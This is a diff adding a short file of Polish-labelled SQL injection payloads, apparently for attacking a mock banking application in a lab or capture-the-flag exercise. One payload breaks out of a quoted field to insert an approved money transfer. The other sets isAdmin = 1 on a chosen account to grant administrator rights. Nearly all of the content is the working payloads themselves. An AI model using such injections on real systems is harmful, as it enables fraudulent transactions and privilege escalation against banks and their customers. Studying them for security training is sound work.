@@ -1,0 +1,8 @@
+
+wykonać dowolny przelew zatwierdzony
+
+4567",9999,1);INSERT INTO transactions (time, senderAccountNumber, receiverAccountNumber, amount, isApproved) VALUES (123, 2345, "4567
+
+przyznac sobie prawa administratora
+
+1234",1,0);UPDATE users SET isAdmin = 1 WHERE accountNumber LIKE 4567;INSERT INTO transactions (time, senderAccountNumber, receiverAccountNumber, amount, isApproved) VALUES (123, 2345, "4567
